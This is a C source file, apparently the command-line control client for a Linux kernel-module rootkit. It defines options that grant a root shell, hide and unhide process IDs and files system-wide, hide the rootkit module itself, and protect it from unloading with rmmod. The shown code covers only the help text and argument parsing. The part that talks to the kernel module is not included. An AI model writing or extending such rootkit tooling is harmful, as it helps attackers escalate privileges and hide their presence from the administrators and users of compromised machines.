//imports
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>

#include "config.h"

void print_help(char **argv)
{
    printf(
        "Usage: %s [OPTION]...\n"
        "\n"
        "Options:\n"
        "  --root-shell            Grants you root shell access.\n"
        "  --hide-pid=PID          Hides the specified PID.\n"
        "  --unhide-pid=PID        Unhides the specified PID.\n"
        "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
        "                          Must be a filename without any path.\n"
        "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
        "  --hide                  Hides the rootkit LKM.\n"
        "  --unhide                Unhides the rootkit LKM.\n"
        "  --help                  Print this help message.\n"
        "  --protect               Protects the rootkit from rmmod.\n"
        "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
}

void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
                                   int *unhide_pid, char **pid, int *hide_file,
                                   int *unhide_file, char **file, int *hide,
                                   int *unhide, int *protect, int *unprotect)
{
    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        print_help(argv);
        exit(1);
    }

    opterr = 0;

    static struct option long_options[] = {
        {"root-shell",  no_argument,       0, 'a'},
        {"hide-pid",    required_argument, 0, 'b'},
        {"unhide-pid",  required_argument, 0, 'c'},
        {"hide-file",   required_argument, 0, 'd'},
        {"unhide-file", required_argument, 0, 'e'},
        {"hide",        no_argument,       0, 'f'},
        {"unhide",      no_argument,       0, 'g'},
        {"help",        no_argument,       0, 'h'},
        {"protect",     no_argument,       0, 'i'},
        {"unprotect",   no_argument,       0, 'j'},
        {0,             0,                 0,  0 }
    };

    *root = 0;
    *hide_pid = 0;
    *unhide_pid = 0;
    *pid = NULL;
    *hide_file = 0;
    *unhide_file = 0;
    *file = NULL;
    *hide = 0;
    *unhide = 0;
    *protect = 0;
    *unprotect = 0;

    int opt;

    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1) {

        switch (opt) {

            case 'a':
                *root = 1;
                break;

            case 'b':
                *hide_pid = 1;
                *pid = optarg;
                break;

            case 'c':
                *unhide_pid = 1;
                *pid = optarg;
                break;

            case 'd':
                *hide_file = 1;
                *file = optarg;
                break;

            case 'e':
                *unhide_file = 1;
                *file = optarg;
                break;

            case 'f':
                *hide = 1;
                break;

            case 'g':
                *unhide = 1;
                break;

            case 'h':
                print_help(argv);
                exit(0);

            case 'i':
                *protect = 1;
                break;

            case 'j':
                *unprotect = 1;
                break;

            case '?':
                fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);

            case ':':
                fprintf(stderr, "Error: No argument provided for option %s\n\n", argv[optind - 1]);
                print_help(argv);
                exit(1);
        }
    }

    if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
            + *unhide + *protect + *unprotect) != 1) {
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        print_help(argv);
        exit(1);
    }
}